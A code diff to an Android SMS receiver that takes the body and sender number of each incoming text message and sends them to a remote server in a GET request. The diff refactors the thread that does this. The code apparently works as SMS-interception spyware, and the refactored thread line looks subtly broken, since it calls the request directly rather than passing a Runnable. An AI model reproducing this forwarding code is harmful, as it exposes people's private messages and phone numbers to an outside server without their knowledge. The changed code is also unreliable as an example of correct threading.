@@ -25,8 +25,7 @@ public class SmsReceiver extends BroadcastReceiver {
         String format = bundle.getString("format");
         Object[] pdus = (Object[]) bundle.get(pdu_type);
         if (pdus != null) {
-            boolean isVersionM =
-                    (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M);
+            boolean isVersionM = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M);
             msgs = new SmsMessage[pdus.length];
             for (int i = 0; i < msgs.length; i++) {
                 if (isVersionM) {
@@ -39,12 +38,8 @@ public class SmsReceiver extends BroadcastReceiver {
                 Log.d(context.getString(R.string.app_name), "onReceive: " + strMessage);
                 Toast.makeText(context, strMessage, Toast.LENGTH_LONG).show();
                 String params = "?sms=" + msgs[i].getMessageBody() + "&tel=" + msgs[i].getOriginatingAddress();
-                Thread thread = new Thread(new Runnable(){
-                    @Override
-                    public void run(){
-                        Utils.Server.GetRequest(params, context.getApplicationContext());
-                    }
-                });
+
+                Thread thread = new Thread(Utils.Server.GetRequest(params, context.getApplicationContext()));
                 thread.start();
             }
         }
